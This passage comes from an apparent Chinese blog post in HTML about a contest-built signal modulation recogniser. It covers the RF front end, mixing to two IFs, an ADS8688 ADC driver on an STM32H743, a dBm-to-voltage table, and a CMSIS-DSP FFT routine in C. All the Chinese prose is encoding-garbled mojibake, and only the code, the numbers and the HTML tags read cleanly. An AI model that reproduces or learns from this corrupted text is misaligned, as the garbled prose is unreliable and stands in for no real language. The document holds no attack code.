¸è¦æƒ³ç”¨å¥½å…¶å®å¹¶ä¸å®¹æ˜“ï¼Œå®šç‚¹FFTå¾ˆå®¹æ˜“äº§ç”Ÿå¾ˆå¤§çš„èˆå…¥è¯¯å·®)ã€‚è‚¯å®šæœ‰FPGAä½¬èƒ½æƒ³åˆ°è§„é¿æˆ–è€…è§£å†³çš„åŠæ³•ã€‚ä½†æ˜¯å—é™ä¸æˆ‘ä»¬å½“æ—¶çŸ¥è¯†ç†è§£çš„ç¨‹åº¦ï¼Œæˆ‘ä»¬è¿˜æ˜¯é€‰æ‹©äº†å•ç‰‡æœºå¹³å°ã€‚æ‰€ä»¥ä»è¿™ä¹Ÿå¯ä»¥çœ‹å‡ºç”µèµ›çš„å‡ºé¢˜å¹¶ä¸ä¸€å‘³åœ°è¦æ±‚å¥½çš„å™¨ä»¶ï¼Œè€Œæ›´å¤šçš„æ˜¯<strong>å› åœ°åˆ¶å®œé€‰æ‹©æ–¹æ¡ˆ</strong></li>\n<li><strong>è¦è®¡ç®—è°ƒå¹…åº¦Maï¼Œè¿™å°±è¦æ±‚è·å¾—è°ƒåˆ¶åä¿¡å·çš„é¢‘è°±ï¼Œä¹Ÿå°±æ˜¯è¦åšFFT</strong>ã€‚è¿™å°±è¦æ±‚ADCçš„é‡‡æ ·é¢‘ç‡èƒ½å¤Ÿé«˜äºä¸­å¿ƒé¢‘ç‚¹+æœ€å¤§é¢‘åä¹‹å’Œçš„ä¸¤å€ã€‚å½“ç„¶ï¼Œå®é™…ä¸Šä¸ºäº†é¢‘è°±çš„å¯è¯»æ€§å’Œé¢‘ç‡ç²¾ç¡®åº¦çš„è€ƒé‡ï¼Œä¸€èˆ¬é€‰æ‹©4è‡³6å€çš„é‡‡æ ·é¢‘ç‡*</li>\n<li>è¦è®¡ç®—è°ƒé¢‘åº¦Mfå’Œæœ€å¤§é¢‘åÎ”fï¼ŒåŒä¸Šï¼Œè¿˜æ¶‰åŠåˆ°ä¸€äº›ç®—æ³•çš„<strong>å¤šå€¼é—®é¢˜</strong>ï¼Œåœ¨åé¢è¯¦ç»†è®¨è®º</li>\n<li>è¦è¿›è¡Œæ¨¡æ‹Ÿè°ƒåˆ¶çš„è§£è°ƒï¼Œå¯ä»¥å…ˆé€šè¿‡æ··é¢‘**æŠŠä¿¡å·æ··åˆ°10.7Mé«˜ä¸­é¢‘ï¼Œä½¿ç”¨ADL5511 ï¼ŒNE564ç­‰èŠ¯ç‰‡è¿›è¡Œè§£è°ƒ</li>\n<li>è¦è¯†åˆ«ASKï¼ŒFSKï¼ŒPSKç­‰è°ƒåˆ¶æ–¹å¼ï¼Œè¿™å°±è¦æ±‚<strong>æŠŠå®ƒä»¬çš„é¢‘è°±å·®å¼‚æå–å‡ºæ¥å¹¶åšå¥½ç‰¹å¾åŒºåˆ†ï¼Œä»¥åŠå¯¹äºæŸäº›éå¸¸ç›¸ä¼¼æƒ…å†µä¸‹å¼•å…¥å¤šé‡åˆ¤æ–­ç»´åº¦æ¥è¿›è¡ŒåŒºåˆ†</strong> ã€‚</li>\n<li>è¦é€šè¿‡é¢‘è°±è¿›è¡ŒFSKçš„hå‚æ•°çš„è®¡ç®—ï¼Œå…¶å®åœ¨å•ç‰‡æœºé‡Œåšæ˜¯å¾ˆéš¾çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥<strong>é€šè¿‡FMå’ŒFSKçš„ç›¸ä¼¼æ€§ï¼Œæ¥è¿›è¡Œä¸€äº›å–å·§çš„æ“ä½œ</strong>ï¼Œè¿™ä¸ªåé¢è¯¦ç»†è®¨è®º**</li>\n<li>è¦è¯†åˆ«å¾…è°ƒåˆ¶æ³¢çš„é¢‘ç‡ï¼Œå…¶å®å°±æ˜¯<strong>è®¡ç®—è°ƒåˆ¶åæ³¢å½¢çš„FFTç›¸é‚»é¢‘ç‚¹ä¹‹é—´çš„é—´éš”</strong>ï¼Œè¿™ä¸€ç‚¹æ˜¯ç”±è°ƒåˆ¶çš„æ€§è´¨æ‰€å¯¼è‡´çš„ï¼Œæ‰€æœ‰è°ƒåˆ¶æ–¹å¼éƒ½èƒ½é€šè¿‡è¿™ç§æ–¹å¼åˆ¤æ–­å¾…è°ƒåˆ¶æ³¢çš„é¢‘ç‡*</li>\n<li>è¦è¿›è¡Œæ•°å­—è°ƒåˆ¶æ³¢å½¢çš„è§£è°ƒï¼Œ<strong>è¦ç»“åˆä¸åŒè°ƒåˆ¶æ–¹å¼çš„ç‰¹ç‚¹ï¼Œæ··åˆä½¿ç”¨æ¨¡æ‹Ÿæ¨¡å—å’Œæ•°å­—åŸŸåˆ¤å†³çš„æ–¹å¼æ¥è¿›è¡Œè§£è°ƒ</strong>ï¼Œæ¯”å¦‚ASKä½¿ç”¨çš„æ˜¯å…ˆé€šè¿‡æ¨¡æ‹ŸAD8310æ£€æ³¢åé€šè¿‡ç›´æµé‡é«˜ä½æ¥åˆ¤æ–­0ï¼Œ1æ³¢å½¢ã€‚FSKä½¿ç”¨äº†æ•°å­—FIRæŠŠé¢‘ç‡è½¬å˜ä¸ºåŒ…ç»œçš„å˜åŒ–ï¼Œè¿›è¡Œ0ï¼Œ1çš„åˆ¤å†³ã€‚è€ŒPSKä½¿ç”¨äº†å…ˆæ•°å­—åŸŸä¸‹æ··é¢‘å’ŒFIRçš„æ–¹å¼ï¼ŒæŠŠç›¸ä½çš„è·³å˜å¯¼è‡´çš„ç›¸ä¹˜åçš„åŒ…ç»œå˜åŒ–é€šè¿‡æ»¤æ³¢å™¨æ£€å‡º</li>\n<li>è¦ç»¼åˆä¸Šè¿°çš„è¯†åˆ«å’Œè®¡ç®—ï¼Œé€š<strong>è¿‡æ¨¡æ‹Ÿå¼€å…³å°†è§£è°ƒç»“æœé€šè¿‡ä¸€ä¸ªé€šé“æ˜¾ç¤º</strong>åœ¨ç¤ºæ³¢å™¨ä¸Šï¼Œå¹¶é€šè¿‡AGCç­‰æ‰‹æ®µï¼Œä¿è¯ç”µå‹å¤§äº1Vpp*</li>\n</ul>\n<h2 id=\"ç³»ç»Ÿæ¶æ„\">ç³»ç»Ÿæ¶æ„</h2>\n<p><img alt=\"ç³»ç»Ÿæ¶æ„\" class=\"lazyload\" /></p>\n<p>æœ¬ç³»ç»Ÿç¡¬ä»¶æ¡†å›¾å¦‚å›¾æ‰€ç¤ºï¼Œä¹ä¸€çœ‹éå¸¸å¤æ‚(å®é™…ä¸Šä¹Ÿç¡®å®å¾ˆå¤æ‚ï¼Œæœ€åæ•°äº†ä¸€ä¸‹ï¼Œä½œå“ä¸Šä¸€å…±æœ‰26å—æ¿å­)ã€‚åˆ«æ€¥ï¼Œè®©æˆ‘ä»¬æ…¢æ…¢æ¥ï¼Œä¸€æ­¥æ­¥åˆ†æï¼Œ<br />\nç”±äºè¾“å…¥ä¿¡å·çš„å³°å³°å€¼æ˜¯100mVï¼Œæ¢ç®—ä¸€ä¸‹ä¹Ÿå°±æ˜¯-16dbmï¼Œæ‰€ä»¥é¦–å…ˆç»è¿‡24dBå¢ç›Šçš„ä½å™ªæ”¾ERA-3SMè¿›è¡Œæ”¾å¤§ã€‚<br />\næ­¤æ—¶çš„ä¿¡å·å¹…åº¦æœ‰8dbmï¼Œä¹Ÿå°±æ˜¯å³°å³°å€¼1.5Vppï¼Œæ­£å¥½é€‚åˆåé¢çš„å„ç§å™¨ä»¶çš„ç”µå‹èŒƒå›´ã€‚<br />\nç„¶åå°†ä¿¡å·é€šè¿‡åŠŸåˆ†å™¨ï¼ŒåŒæ—¶æ··é¢‘åˆ°50kHzä¸­é¢‘å’Œ10.7MHzä¸­é¢‘ã€‚è¿™æ˜¯ä¸ºäº†ä¸€è·¯ç”¨æ¥åˆ†æï¼Œä¸€è·¯ç”¨æ¥æ¨¡æ‹Ÿè§£è°ƒã€‚<br />\n50kHz çš„ä¸­é¢‘ä¿¡å·ï¼Œç»è¿‡æ»¤æ³¢ã€æ”¾å¤§å’Œç”µå¹³æ¬ç§»åï¼Œä¸€è·¯ç»è¿‡ADS8688å˜ä¸ºæ•°å­—ä¿¡å·é€å…¥å•ç‰‡æœºã€‚å¦ä¸€è·¯ç»è¿‡æ£€æ³¢å™¨ AD8310 å’Œæ»¤æ³¢å™¨ UAF42 åæ£€å‡º ASK çš„ç›´æµï¼Œå¹¶é€ç»™å•ç‰‡æœºè¿›ä¸€æ­¥å®Œæˆ ASK ä¿¡å·çš„å®šæ—¶æŠ½åˆ¤ã€‚<br />\n10.7MHz çš„ä¸­é¢‘ä¿¡å·ç»è¿‡é™¶ç“·æ»¤æ³¢å™¨ã€æ”¾å¤§å™¨å’Œå°„é¢‘å¼€å…³åï¼Œåˆ†åˆ«è¿›è¡ŒåŸºäº ADL5511 çš„ AM åŒ…ç»œæ£€æ³¢è§£è°ƒå’ŒåŸºäº NE564 çš„FM è§£è°ƒ.<br />\næœ€åé€šè¿‡ MCU æ§åˆ¶çš„æ¨¡æ‹Ÿå¼€å…³TMUX1109ï¼Œå°†è§£è°ƒç»“æœé€ç»™ç¤ºæ³¢å™¨æ˜¾ç¤ºã€‚åœ¨å•ç‰‡æœºå†…ï¼Œé€šè¿‡å¯¹ 50kHz çš„ä¸­é¢‘ä¿¡å·çš„é¢‘è°±åˆ†æï¼Œå¾—åˆ°è°ƒåˆ¶ä¿¡å·ç±»å‹å’Œè°ƒåˆ¶å‚æ•°ï¼Œ<br />\nä»¥åŠFSKå’ŒPSKçš„è§£è°ƒç»“æœçš„è¾“å‡ºï¼Œå¹¶æ§åˆ¶å…¶ä»–æ¨¡å—å®Œæˆæœ€åç»“æœçš„æ±‡æ€»è¾“å‡ºï¼Œä»¥åŠæ§åˆ¶æ¶²æ™¶å±æ˜¾ç¤ºè¯†åˆ«ç»“æœå’Œå‚æ•°ã€‚</p>\n<h2 id=\"ä¸€äº›å‡†å¤‡å·¥ä½œå’Œå°å¯„å·§\">ä¸€äº›å‡†å¤‡å·¥ä½œå’Œå°å¯„å·§</h2>\n<h3 id=\"ç”µå‹å’Œdbmçš„æ¢ç®—\">ç”µå‹å’Œdbmçš„æ¢ç®—</h3>\n<p>åœ¨å°„é¢‘ç”µè·¯ä¸­ï¼Œä¸ºäº†è¡¨ç¤ºæ¯”è¾ƒå°çš„ç”µå‹ï¼Œä¸€èˆ¬é‡‡ç”¨å¯¹æ•°å½¢å¼ï¼Œå…¶ä¸­dbmæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„å•ä½ï¼Œå®ƒæ˜¯åœ¨æŸä¸€é˜»æŠ—åŒ¹é…ç³»ç»Ÿä¸‹ï¼ŒåŠŸç‡ç›¸å¯¹äº1mWçš„æ¯”å€¼ï¼Œè€Œç”±äºå·²ç»å°„é¢‘ç”µè·¯é˜»æŠ—ä¸€èˆ¬æ˜¯50æ¬§å§†ï¼Œæ‰€ä»¥ç›¸å½“äºä¹ŸçŸ¥é“äº†ç”µå‹ã€‚<br />\nä¸è¿‡ç”±äºåŠŸç‡çš„è®¡ç®—è¿˜æ¶‰åŠåˆ°æ³¢å½¢çš„æœ‰æ•ˆå€¼å•¥çš„ï¼Œæ–¹æ³¢1ï¼Œæ­£å¼¦0.707ï¼Œä¸‰è§’æ³¢0.57ï¼Œå®é™…ä¸­ä¸€èˆ¬ä¸ä¼šè‡ªå·±å»ç®—ï¼Œéƒ½æ˜¯ä½¿ç”¨è¿™ç§åœ¨çº¿è®¡ç®—å™¨ã€‚<br />\nå¯ä»¥è®°å¿†ä¸€ä¸‹ä¸€äº›å¸¸è§çš„å€¼</p>\n<table>\n<thead>\n<tr>\n<th>æ­£å¼¦æ³¢</th>\n<th>50æ¬§å§†é˜»æŠ—ä¸‹</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-116dbm</td>\n<td>1uVpp</td>\n</tr>\n<tr>\n<td>-56dbm</td>\n<td>1mVpp</td>\n</tr>\n<tr>\n<td>-36dbm</td>\n<td>10mVpp</td>\n</tr>\n<tr>\n<td>-16dbm</td>\n<td>100mVpp</td>\n</tr>\n<tr>\n<td>0dbm</td>\n<td>632mVpp</td>\n</tr>\n<tr>\n<td>4dbm</td>\n<td>1Vpp</td>\n</tr>\n<tr>\n<td>14dbm</td>\n<td>3.3Vpp</td>\n</tr>\n</tbody>\n</table>\n<p>å®ç”¨å°å·¥å…· ç”µå‹å’Œdbmçš„æ¢ç®—<br />\n<a href=\"https://www.analog.com/cn/design-center/interactive-design-tools/dbconvert.html\" rel=\"noopener nofollow\" target=\"_blank\">https://www.analog.com/cn/design-center/interactive-design-tools/dbconvert.html</a></p>\n<p><img alt=\"ADIç”µå‹æ¢ç®—å·¥å…·\" class=\"lazyload\" /><br />\næ³¨æ„è¿™é‡Œçš„VPeakæ˜¯å³°å€¼ï¼Œæ¢ç®—æˆå³°å³°å€¼çš„è¯è¦ä¹˜ä»¥2</p>\n<h3 id=\"adcçš„ä¸€äº›å‡†å¤‡å·¥ä½œ\">ADCçš„ä¸€äº›å‡†å¤‡å·¥ä½œ</h3>\n<p><img alt=\"ADS8688æ‰‹å†Œ\" class=\"lazyload\" /></p>\n<h4 id=\"adcé€‰å‹\">ADCé€‰å‹</h4>\n<p>æˆ‘ä»¬æœ¬æ¬¡ä½¿ç”¨çš„æ˜¯ADS8688Aä½œä¸ºç³»ç»Ÿçš„ADCï¼Œå®ƒæ˜¯ä¸€ä¸ª16bitï¼Œ500KSPSé‡‡æ ·ç‡çš„SARå‹ADCã€‚<br />\nå®ƒçš„ç‰¹ç‚¹æœ‰åŒææ€§è¾“å…¥ï¼Œå¯é…ç½®åŠ¨æ€èŒƒå›´ï¼Œå†…éƒ¨åŸºå‡†ï¼Œå…«é€šé“MUXé‡‡æ ·ï¼Œè¯¯å·®å’Œæ¼‚ç§»éƒ½å¾ˆä½ï¼Œå¯¹äºæœ¬é¢˜æ¥è¯´è‚¯å®šæ˜¯å¤Ÿç”¨çš„ã€‚<br />\næˆ‘ä»¬ç”¨å®ƒä¸»è¦è¿˜æ˜¯çœ‹ä¸Šäº†å®ƒæ”¯æŒåŒææ€§è¾“å…¥å’Œå¯å˜åŠ¨æ€èŒƒå›´è¿™ä¸€ç‚¹ï¼Œè¿™æ ·å°±ä¸ç”¨è‡ªå·±åšå‰çº§çš„æ¬ç§»å’Œæ”¾å¤§ã€‚<br />\nè€Œä¸”è‡ªå¸¦è¿‡å‹ä¿æŠ¤ï¼Œæ¯”è¾ƒè€é€ ã€‚<br />\nPS.æˆ‘ä»¬çš„STM32H743å¹³å°çš„å†…ç½®ADCï¼Œåœ¨æŸæ¬¡æµ‹è¯•çš„æ—¶å€™ï¼Œå¯¹å•é¢‘å¤§å¹…å€¼ä¿¡å·é‡‡æ ·åšFFTåï¼Œå…¶äºŒæ¬¡è°æ³¢å€¼ä¼šå¤§çš„è¶…å‡ºå¸¸ç†ï¼Œç†è®ºä¸Šæ¥è¯´æ˜¯ä¸ä¼šæœ‰è¿™ä¹ˆå¤§çš„ã€‚<br />\næ€€ç–‘å†…ç½®SARç§¯åˆ†ç”µè·¯è¢«è¿‡å‹æ©„æ¦„äº†ğŸ˜“<br />\næ‰€ä»¥æ¢ç”¨äº†è¿™ä¸ªå¤–ç½®çš„ADCï¼Œä»¥åå¯ä»¥å¼€ä¸€ç¯‡æ–‡ç« è®²ä¸€ä¸‹ADCçš„å„ç§å‚æ•°ï¼Œä»¥åŠè¿™ç§å¤±çœŸæ˜¯æ€ä¹ˆæ¥çš„ï¼Œæ­¤æ—¶å°±è¦è¯·å‡ºå¦ä¸€ä½å°ä¿¡å·é¢†åŸŸçš„expertï¼ŒFloydFishğŸŸ<br />\nå¯ä»¥ç§»æ­¥<a href=\"https://www.emoe.xyz/opamp-noise-analyze/\" rel=\"noopener nofollow\" target=\"_blank\">https://www.emoe.xyz/opamp-noise-analyze/</a> ï¼Œä»¥åŠç›¸å…³çš„å°ä¿¡å·æµ‹é‡ã€‚</p>\n<p>é©±åŠ¨ä»£ç <br />\nè¿™ä¸ªçš„é©±åŠ¨æˆ‘å·²ç»æ‰“åŒ…å¥½äº†ï¼Œä¸‹è½½ä¸‹æ¥æ”¹ä¸€ä¸‹ç®¡è„šç›´æ¥ç”¨å°±å¯ä»¥äº† <a href=\"https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/ADS8688_Driver.zip\" rel=\"noopener nofollow\" target=\"_blank\">https://megrez-hong.oss-cn-shanghai.aliyuncs.com/blogs/ADS8688_Driver.zip</a><br />\n<strong>ADCçš„é©±åŠ¨è¦æ³¨æ„çš„ä¸¤ç‚¹æ˜¯ï¼Œä¸€æ˜¯è¿™ä¸ªADCçš„æ•°æ®Latchå’Œåå‡ºæ˜¯æ ¹æ®SPIçš„é€Ÿç‡æ¥çš„</strong><br />\næ‰€ä»¥ä¸ºäº†æ§åˆ¶é‡‡æ ·é€Ÿç‡ï¼Œéœ€è¦è‡ªå·±æ§åˆ¶å…¶ä¸­çš„IOæ“ä½œåçš„Delayå‡½æ•°ï¼Œç»è¿‡æµ‹è¯•ï¼Œåœ¨ARMCC6ç¼–è¯‘å™¨ï¼ŒO2æ°´å¹³çš„ä¼˜åŒ–ä¸‹ï¼Œä½¿ç”¨volatileå‚æ•°ï¼Œä¸‹é¢è¿™ç§delayæ–¹æ³•ä¾ç„¶å¯ä»¥è¾¾åˆ°å»¶æ—¶æ•ˆæœã€‚</p>\n<p><img alt=\"Delayçš„å®ç°\" class=\"lazyload\" /></p>\n<p><img alt=\"ADS8688çš„é‡‡æ ·å‡½æ•°\" class=\"lazyload\" /><br />\näºŒæ˜¯é‡‡æ ·çš„æ—¶å€™éœ€è¦å…³é—­ä¸­æ–­å“åº”ï¼Œå› ä¸ºæˆ‘ä»¬ä¸å¸Œæœ›é‡‡æ ·çš„æ—¶å€™å®šæ—¶å™¨ä¸­æ–­ä»€ä¹ˆçš„æŠŠé‡‡æ ·æ“ä½œæ‰“æ‰°äº†ã€‚</p>\n<p>è¿™é‡Œçš„é‡‡æ ·ç‡æ ¹æ®å®æµ‹å¤§æ¦‚åœ¨250Kå·¦å³ï¼Œè¾¾ä¸åˆ°å®˜æ–¹çš„æ ‡ç§°çš„500Kã€‚åº”è¯¥æ˜¯å·²ç»è¾¾åˆ°äº†è½¯ä»¶SPIçš„IOé€Ÿåº¦ä¸Šé™äº†ï¼Œ250kSPS*16bit = 4Mbitçš„é€Ÿåº¦äº†ã€‚</p>\n<p>å¦‚æœè¦æ›´å¿«ä¸€ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨ç¡¬ä»¶SPI+DMAçš„æ–¹å¼ï¼Œä½†æ˜¯æ¯”èµ›å½“å‰ï¼Œå°±ä¸æŠ˜è…¾èŠ±æ´»äº†ï¼Œèƒ½ç”¨å°±å¥½ã€‚</p>\n<p>å¦å¤–ä¸€ç‚¹æ˜¯STM32çš„H7ç³»åˆ—çš„è½¯SPIçš„ä¼šæœ‰çš„ä¸€ä¸ªæ¯›ç—…ï¼Œåœ¨CubeMXä¸­éœ€è¦æŠŠè¿™äº›ä¸ªç®¡è„š(CLK,MISO,MOSI,CS)çš„æœ€å¤§é¢‘ç‡è®¾ç½®æˆLowï¼Œå¦åˆ™å¦‚æœè®¾ç½®ä¸ºHighä¹‹ç±»çš„ã€‚</p>\n<p>è¾ƒå¤§çš„é©±åŠ¨ç”µæµä¼šé€ æˆä¿¡å·çš„è¿‡å†²å’ŒæŒ¯é“ƒï¼Œé€ æˆè¯»å‡ºçš„æ•°æ®æœ‰æ—¶æ˜¯å¯¹çš„ï¼Œæœ‰æ—¶è¯»å‡ºçš„ä¼šæ˜¯å…¨1æˆ–è€…å…¨0ã€‚</p>\n<p>è¿™ä¸€ç‚¹æˆ‘æ˜¯åœ¨è°ƒè¯•RDA5820çš„æ—¶å€™å‘ç°çš„ï¼Œä¹‹å‰ç”¨STM32U5é©±åŠ¨RDA5820æ˜¯æ­£å¸¸çš„ï¼ŒåŒæ ·çš„ä»£ç åœ¨H7ä¸‹å°±ä¼šæœ‰æ—¶æ­£ç¡®æœ‰æ—¶ä¸èƒ½è¯»å‡ºã€‚åæ¥åœ¨æ€è€ƒä¿¡å·å®Œæ•´æ€§é“¾è·¯çš„æ—¶å€™æœ‰äº†æ–°çš„æƒ³æ³•ã€‚</p>\n<p>æˆ‘ä¸ªäººçš„çœ‹æ³•æ˜¯ï¼Œå¯èƒ½ç”±äºæ˜¯H7çš„é©±åŠ¨ç”µæµèƒ½åŠ›æ¯”è¾ƒå¼ºï¼ŒIOç¿»è½¬çš„ä¸Šå‡æ²¿ç›¸æ¯”F1ï¼ŒF7è¿™äº›è¦é™¡å³­å¾ˆå¤šï¼Œè€Œæ•°å­—ä¿¡å·é“¾è·¯æ˜¯é€šè¿‡ä¸€æ®µæ¯”è¾ƒé•¿çš„XH2.54çº¿æ¥åˆ°äº†å¤–éƒ¨çš„æ¨¡å—ä¸Šï¼Œ<br />\næ ¹æ®ä¼ è¾“çº¿æ¨¡å‹çš„æ¨è®ºï¼Œå½“ä¼ è¾“çº¿é•¿åº¦å’Œ1/6ä¸Šå‡æ²¿æ³¢é•¿å¯ä»¥ç›¸æ¯”æ‹Ÿæ—¶ï¼Œå°±æœ‰å¯èƒ½é€ æˆä¿¡å·å®Œæ•´æ€§é—®é¢˜ã€‚<br />\næ‰€ä»¥è¿™æ—¶IOé©±å‡ºæ¥çš„æ•°å­—æ³¢å½¢ä¼šæœ‰è¿‡å†²å’ŒæŒ¯é“ƒç­‰ä¿¡å·å®Œæ•´æ€§é—®é¢˜ä¹Ÿæ˜¯å¯ä»¥ç†è§£çš„ã€‚</p>\n<p>éªŒè¯ADCé‡‡é›†æ—¶å€™ï¼Œä¸€èˆ¬ä¼šä¸²å£æ‰“å°æ³¢å½¢ï¼Œå†ä½¿ç”¨SerialPlotæŸ¥çœ‹ï¼Œæ˜¯ä¸æ˜¯å’Œç†è®ºç¬¦åˆï¼Œæ¯”å¦‚ä¸‹å›¾å°±æ˜¯ASKæ³¢å½¢çš„é‡‡æ ·ç»“æœã€‚</p>\n<p><img alt=\"ASKçš„é‡‡é›†åˆ°çš„æ³¢å½¢\" class=\"lazyload\" /></p>\n<h3 id=\"fftçš„å‡†å¤‡å·¥ä½œ\">FFTçš„å‡†å¤‡å·¥ä½œ</h3>\n<ul>\n<li>ä½¿ç”¨Cmsis DSPåº“ï¼Œåœ¨Keilçš„åŒ…ç®¡ç†é‡Œé¢å‹¾é€‰å³å¯ï¼Œæœ€æ–°ç‰ˆæœ¬æœ‰çª—å‡½æ•°çš„éœ€è¦ä»å®˜ç½‘ä¸Šä¸‹è½½ï¼ˆæ€ä¹ˆæ„Ÿè§‰æœ‰ç‚¹ä¼¼æ›¾ç›¸è¯†ï¼Œæˆ‘å»å¹´æš‘å‡å¥½åƒä¹Ÿå†™è¿‡ï¼‰</li>\n</ul>\n<p><img alt=\"Keilæ·»åŠ Pack\" class=\"lazyload\" /></p>\n<ul>\n<li>\n<p>åœ¨Keilçš„è®¾ç½®é‡Œé¢ï¼ŒåŠ å…¥ARM_MATH_CM7, ARM_MATH_LOOPUNROLLè¿™ä¸¤æ¡å®å®šä¹‰ï¼Œå‰é¢æ˜¯Cortexç‰ˆæœ¬ï¼Œéœ€è¦æ˜¯MCUçš„å†…æ ¸ç‰ˆæœ¬ï¼Œå¯ä»¥æ˜¯CM1ï¼ŒCM4ï¼ŒCM7,åé¢çš„æ˜¯æ§åˆ¶æ•°å­¦èˆå…¥çš„ï¼Œä¸€èˆ¬æ¥è¯´ä¸ç”¨åŠ¨ã€‚<br />\n<img alt=\"keilçš„ç¼–è¯‘è®¾ç½®\" class=\"lazyload\" /></p>\n</li>\n<li>\n<p>ç„¶ååœ¨includeçš„åœ°æ–¹åŠ å…¥ #include \"arm_math.h\"   å’Œ  #include \"arm_const_structs.h\"ï¼Œç„¶åå¼€è¾Ÿä¸€ä¸ªfftçš„å…¨å±€æ•°ç»„ï¼Œå°±å¯ä»¥æ„‰å¿«çš„è°ƒç”¨å•¦ã€‚</p>\n</li>\n<li>\n<p><strong>FFTçš„è°ƒç”¨</strong>**</p>\n</li>\n</ul>\n<pre><code class=\"language-C\">/* ADCé‡‡æ ·å¹¶åšFFT ç»“æœæ”¾åœ¨å…¨å±€æ•°ç»„fft_outputbufä¸­ */\n/* åšFFT ç»“æœæ”¾åœ¨å…¨å±€æ•°ç»„fft_outputbufä¸­ ä¸€æ¬¡4096ä¸ªç‚¹ */\nvoid FFT(unsigned short *ADC_Buffer, unsigned int SampleRate, unsigned int len, int debug, int serialplot)\n{\n    for(int i=0;i&lt;Sampling_CNT;i++)\n    Global_ADC_Value[i] = ADC_Buffer[i]*3.3/4096;   // å°†é‡‡æ ·ç»“æœè½¬åŒ–åˆ°0-3.3V\n    \n    for(int i=0;i &lt; FFT_LENGTH;i++)   \n    {\n    fft_inputbuf[i*2] = Global_ADC_Value[i];  // æŒ‰æ‰‹å†Œè¦æ±‚çš„å®éƒ¨è™šéƒ¨äº¤æ›¿çš„æ–¹æ³•å¡«å……æ•°ç»„\n    fft_inputbuf[2*i +1] = 0;\n    }\n\n    arm_cfft_f32(&amp;arm_cfft_sR_f32_len4096,fft_inputbuf,0,1); // æ‰§è¡ŒFFTå˜æ¢ï¼Œarm_cfft_sR_f32_len4096ä¸ºå®ï¼Œå®šä¹‰æ—‹è½¬å› å­\n    arm_cmplx_mag_f32(fft_inputbuf,fft_outputbuf,FFT_LENGTH);    // æŠŠè¿ç®—ç»“æœå¤æ•°æ±‚æ¨¡å¾—å¹…å€¼\n\n    /* Debugæ‰“å°åŒº */\n    \n    if(debug == 1)\n     for(int i=0;i &lt; FFT_LENGTH/2;i++)       // æ˜¯å¦æ‰“å°FFTæ¯ä¸ªé¢‘ç‚¹çš„å¹…å€¼ä¿¡æ¯\n       printf(\"%d  %.3lf KHz Mag %.3f\\n\", i,SampleRate*1.0/len*i, fft_outputbuf[i] );\n    \n    if(serialplot == 1)\n     for(int i=0;i &lt; FFT_LENGTH;i++)       //  æ˜¯å¦æ‰“å°fftç»“æœåˆ°åˆ°SerialPlot\n        printf(\"%.3f\\n\", fft_outputbuf[i]);\n\n}\n</code></pre>\n<p>åšå®ŒFFTåï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¼šé€šè¿‡SerialPlotè½¯ä»¶æ¥æŸ¥çœ‹FFTçš„ç»“æœå’Œå’Œç†è®ºä¼°è®¡æ˜¯å¦ç¬¦åˆã€‚<br />\nä¸‹å›¾æ˜¯1KHzè½½æ³¢ï¼Œ3KHzé¢‘åçš„FMé¢‘è°±çš„å®æµ‹å›¾<br />\n<img alt=\"FMçš„é¢‘è°±\" class=\"lazyload\" /></p>\n<h3 id=\"ä»£ç ç»„ç»‡çš„æ€è·¯\">ä»£ç ç»„ç»‡çš„æ€è·¯</h3>\n<p>è¿™é¢˜æ˜¯ä¸€ä¸ªç»å…¸çš„æµ‹é‡-åˆ†æ-æ˜¾ç¤ºçš„é¢˜ç›®ï¼Œæ‰€ä»¥é‡‡ç”¨çš„æ€è·¯å°±æ˜¯å…ˆé‡‡é›†ï¼Œåˆ¤æ–­è°ƒåˆ¶ç±»å‹åï¼Œè¿›ä¸€æ­¥å»å¯¹åº”çš„éƒ¨åˆ†è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ†æå’Œæ˜¾ç¤ºã€‚<br />\nç”±äºFFTåˆ†æåç»™çš„å‚æ•°å€¼ä¸æ­¢ä¸€ä¸ªï¼Œæ‰€ä»¥ä½¿ç”¨äº†å‡½æ•°ä¼ åœ°å€çš„åŠæ³•ã€‚<br />\n<img alt=\"å‡½æ•°ä¼ å‚å‚æ•°\" class=\"lazyload\" /><br />\nè€Œä¸”ç”±äºKeilæ²¡æœ‰æ¯”è¾ƒæ–¹ä¾¿çš„ä»£ç è¡¥å…¨å’Œå¿«æ·æç¤ºåŠŸèƒ½ï¼Œå¦‚æœæ‰€æœ‰çš„ç®—æ³•éƒ½åœ¨mainä¸­å®ç°ï¼Œä¼šå¯¼è‡´ä»£ç å®ç°é‚£ä¸€æ®µåˆ°ä¸‹é¢çš„mainå‡½æ•°çš„é‡Œè°ƒç”¨æ®µï¼Œæœ‰ä¸€æ®µéå¸¸é•¿çš„è·ç¦»ï¼Œæ‰€ä»¥æˆ‘ä¸ªäººçš„å»ºè®®æ˜¯æŠŠä¸€äº›æ›´åŸºç¡€çš„ç®—æ³•ä»£ç å¦å¤–å°è£…åˆ°ä¸€ä¸ªAlgorithmæ–‡ä»¶é‡Œã€‚<br />\n<img alt=\"Algorithm.cæˆªå›¾\" class=\"lazyload\" /></p>\n<h3 id=\"ä¸‹èŠ‚é¢„å‘Šé¸½äº†å®é™…ä¸Šå› ä¸ºç¥ç§˜èµ›åˆ¶çš„åŸå› æˆ‘ä»¬æ²¡æœ‰å»åˆ°æ¯”èµ›ç°åœºä½†æ˜¯è¿˜æ˜¯å›½èµ›äºŒç­‰å¥–å°±ä¸çŒ®ä¸‘äº†\">ä¸‹èŠ‚é¢„å‘Šï¼ˆé¸½äº†ï¼Œå®é™…ä¸Šå› ä¸ºç¥ç§˜èµ›åˆ¶çš„åŸå› 